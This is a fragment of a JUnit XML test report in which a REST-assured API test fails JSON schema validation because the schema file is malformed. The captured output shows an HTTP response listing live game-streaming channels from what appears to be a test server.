    <failure message="com.github.fge.jsonschema.core.exceptions.ProcessingException: fatal: content at URI &quot;file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#&quot; is not valid JSON&#10;    level: &quot;fatal&quot;&#10;    uri: &quot;file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#&quot;&#10;    parsingMessage: &quot;Unexpected character (&apos;\&quot;&apos; (code 34)): was expecting comma to separate OBJECT entries&quot;&#10;" type="com.jayway.restassured.module.jsv.JsonSchemaValidationException">com.jayway.restassured.module.jsv.JsonSchemaValidationException: 
com.github.fge.jsonschema.core.exceptions.ProcessingException: fatal: content at URI "file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#" is not valid JSON
    level: "fatal"
    uri: "file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#"
    parsingMessage: "Unexpected character ('\"' (code 34)): was expecting comma to separate OBJECT entries"

	at com.emma.app.my_rest_test.ChushouSDKApiTest.testOnlineVideoList(ChushouSDKApiTest.java:138)
Caused by: com.github.fge.jsonschema.core.exceptions.ProcessingException: 
fatal: content at URI "file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#" is not valid JSON
    level: "fatal"
    uri: "file:/D:/workspace/my-rest-test/target/test-classes/onlinevideo.json#"
    parsingMessage: "Unexpected character ('\"' (code 34)): was expecting comma to separate OBJECT entries"

	at com.emma.app.my_rest_test.ChushouSDKApiTest.testOnlineVideoList(ChushouSDKApiTest.java:138)
</failure>
    <system-out><![CDATA[_sign_online65ef3f8cdab17a4bf7986e321b791e67
HTTP/1.1 200 OK
Server: nginx/1.9.0
Date: Fri, 09 Sep 2016 01:05:27 GMT
Content-Type: text/plain;charset=UTF-8
Content-Length: 8583
Connection: keep-alive
Set-Cookie: _i7=6484836bea634058bbd001b21c1ee8e4; Expires=Mon, 15-Apr-2019 01:05:27 GMT; Path=/; HttpOnly

{"code":0,"message":"","data":{"count":47,"items":[{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://sc-live.kascend.com/jellyfish-test/19/1011/1473383115522.jpg!jellyfishnavstyle1","targetKey":"1011","meta":{"onlineCount":19,"creator":"宝宝","gender":"female","gameName":"天天酷跑online","subscriberCount":9,"gameTargetKey":"3-1013-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150615/1434359024687.jpg!jellyfishavatar","gameCtxPath":"qqdzz","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"","targetKey":"1002","meta":{"onlineCount":19,"creator":"官方频道2","gender":"unknow","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"","targetKey":"698","meta":{"onlineCount":19,"creator":"安妮、","gender":"female","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150610/1433940639857.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://kascdn.kascend.com/jellyfish-test/14/718/1448615334568.jpg!jellyfishnavstyle1","targetKey":"718","meta":{"onlineCount":18,"creator":"micah05","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish-test/avatar/20160120/163_1453274145870.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"","targetKey":"712","meta":{"onlineCount":18,"creator":"qwqwqw","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"","targetKey":"687","meta":{"onlineCount":18,"creator":"胖胖","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150608/1433750052413.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://sc-live.kascend.com/jellyfish-test/22/1014/1473383115520.jpg!jellyfishnavstyle1","targetKey":"1014","meta":{"onlineCount":17,"creator":"Dapeng.W","gender":"male","gameName":"天天酷跑online","subscriberCount":5,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150921/1442830206389.JPG!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://kascdn.kascend.com/jellyfish-test/16/1008/1442988295280.jpg!jellyfishnavstyle1","targetKey":"1008","meta":{"onlineCount":17,"creator":"官方频道8哈哈","gender":"female","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"","targetKey":"680","meta":{"onlineCount":17,"creator":"橙子","gender":"female","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150615/1434369878.JPG!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://kascdn.kascend.com/jellyfish-test/1/1025/1457666095521.jpg!jellyfishnavstyle1","targetKey":"1025","meta":{"onlineCount":16,"creator":"用户_140","gender":"female","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150615/1434357361712.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://sc-live.kascend.com/jellyfish-test/0/1024/1473383115486.jpg!jellyfishnavstyle1","targetKey":"1024","meta":{"onlineCount":16,"creator":"emma","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/20150917/66_1442471708813.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://kascdn.kascend.com/jellyfish-test/10/714/1456368070131.jpg!jellyfishnavstyle1","targetKey":"714","meta":{"onlineCount":16,"creator":"4444","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/default/default_avatar_1.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"萝卜3","style":1,"cover":"http://sc-live.kascend.com/jellyfish-test/25/4075001/1473383115523.jpg!jellyfishnavstyle1","targetKey":"4075001","meta":{"onlineCount":15,"creator":"萝卜3","gender":"male","gameName":"全民超神online","subscriberCount":10,"gameTargetKey":"3-1065-3","avatar":"http://kascdn.kascend.com/jellyfish/uiupload/default/default-3.png!jellyfishavatar","gameCtxPath":"","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://kascdn.kascend.com/jellyfish-test/20/1012/1457681231835.jpg!jellyfishnavstyle1","targetKey":"1012","meta":{"onlineCount":15,"creator":"test5张三李四王五","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150701/1435736423336.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"","targetKey":"701","meta":{"onlineCount":15,"creator":"MMA","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150612/1434071747957.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"","targetKey":"700","meta":{"onlineCount":15,"creator":"橙子老师","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150611/1434022924819.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://sc-live.kascend.com/jellyfish-test/23/1047/1473383115514.jpg!jellyfishnavstyle1","targetKey":"1047","meta":{"onlineCount":14,"creator":"我头疼","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/uiupload/default/default-1.png!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"","targetKey":"1013","meta":{"onlineCount":14,"creator":"葫芦丶","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150610/1433927617342.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://sc-live.kascend.com/jellyfish-test/12/716/1473383115503.jpg!jellyfishnavstyle1","targetKey":"716","meta":{"onlineCount":14,"creator":"Stockholm","gender":"male","gameName":"天天酷跑online","subscriberCount":2,"gameTargetKey":"3-1008-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150625/1435221345708.jpg!jellyfishavatar","gameCtxPath":"pao","live":true,"professional":1}},{"type":1,"name":"天天酷跑online+11111111111111111111","style":1,"cover":"http://kascdn.kascend.com/jellyfish-test/11/715/1450059482466.jpg!jellyfishnavstyle1","targetKey":"715","meta":{"onlineCount":14,"creator":"四五理你","gender":"male","gameName":"天天酷跑online","subscriberCount":3,"gameTargetKey":"3-1013-3","avatar":"http://kascdn.kascend.com/jellyfish/avatar/150625/1435220682639.jpg!jellyfishavatar","gameCtxPath":"qqdzz","live":true,"professional":1}}],"breakpoint":"715-0-14"}}
]]></system-out>
  </testcase>
</testsuite>